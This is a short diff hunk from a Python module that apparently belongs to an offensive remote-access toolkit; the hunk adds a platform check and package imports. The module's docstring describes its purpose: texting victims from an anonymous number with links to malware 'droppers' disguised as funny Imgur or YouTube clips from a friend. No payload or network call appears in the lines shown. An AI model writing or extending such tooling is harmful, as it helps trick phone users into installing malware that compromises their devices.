@@ -19,12 +19,19 @@ command = True
 results = Queue.Queue()
 packages  = ['twilio']
 platforms = ['win32','linux2','darwin']
+results = {}
 usage = 'phone <call/sms> [option=value, ...]'
 description = """ 
 Use an anonymous online phone number to send an SMS text message 
 containing download links to executable client droppers disguised 
 as a link to a funny image/video on Imgur/YouTUbe sent from a friend
 """
+
+# setup
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def run(message=None, number=None, sid=None, token=None):
